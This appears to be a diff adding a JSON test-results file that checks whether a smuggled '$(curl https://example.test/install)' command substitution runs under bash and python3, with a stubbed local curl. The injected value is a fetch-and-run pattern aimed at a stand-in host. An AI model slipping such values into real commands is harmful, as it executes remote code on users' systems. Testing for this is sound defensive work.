@@ -1,0 +1,19 @@
+{
+  "method": "Local fake curl prints a harmless printf command; no remote payload fetched or executed",
+  "cases": [
+    {
+      "interpreter": "/bin/bash",
+      "single_quoted_outer_shell_argument": "$(curl https://example.test/install)",
+      "returncode": 0,
+      "stub_command_executed": true,
+      "network_requested": false
+    },
+    {
+      "interpreter": "/usr/bin/python3",
+      "single_quoted_outer_shell_argument": "$(curl https://example.test/install)",
+      "returncode": 1,
+      "stub_command_executed": false,
+      "network_requested": false
+    }
+  ]
+}
